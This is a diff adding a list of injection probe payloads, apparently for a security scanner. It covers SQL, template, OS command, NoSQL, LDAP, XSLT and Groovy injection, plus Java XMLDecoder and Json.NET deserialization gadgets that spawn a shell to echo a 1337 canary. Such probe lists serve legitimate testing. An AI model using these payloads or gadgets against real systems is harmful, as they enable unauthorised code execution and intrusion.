@@ -1,0 +1,26 @@
+##POLYGLOT - SQLi Cross-Dialect (Math: 1337)##
+'UNION SELECT 7*191--/*'UNION SELECT 7*191,7*191--*/"UNION SELECT 7*191,7*191,7*191--
+##POLYGLOT - SSTI Cross-Engine (Math: 1337)##
+{{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}#set($x=7*191)$x[=7*191]@(7*191)
+##POLYGLOT - OS Command Injection Cross-Shell (Math: 1337)##
+;echo $((7*191)) #'|expr 7 \* 191|"$(echo $((7*191)))`expr 7 \* 191`
+##POLYGLOT - Code Injection Cross-Language (Math: 1337)##
+7*191
+##POLYGLOT - NoSQL Injection (Math: 1337)##
+return 7*191
+##POLYGLOT - EL Injection Cross-Engine (Math: 1337)##
+${7*191}
+##SSI Injection - Math (1337)##
+<!--#set var="x" value="1337" --><!--#echo var="x" -->
+##LDAP Injection - Math-Based (Canary: 1337)##
+*)(uid=1337)(&(objectClass=*
+##XSLT Injection - Math-Based (Canary: 1337)##
+<xsl:value-of select="7*191"/>
+##Elasticsearch Injection - Math-Based (Canary: 1337)##
+{"script_fields":{"x":{"script":"7*191"}}}
+##Groovy Code Injection - Math-Based (Canary: 1337)##
+new GroovyShell().evaluate('7*191')
+##XMLDecoder - Math (echo 1337)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>
+##.NET Json.NET - Math (echo 1337)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
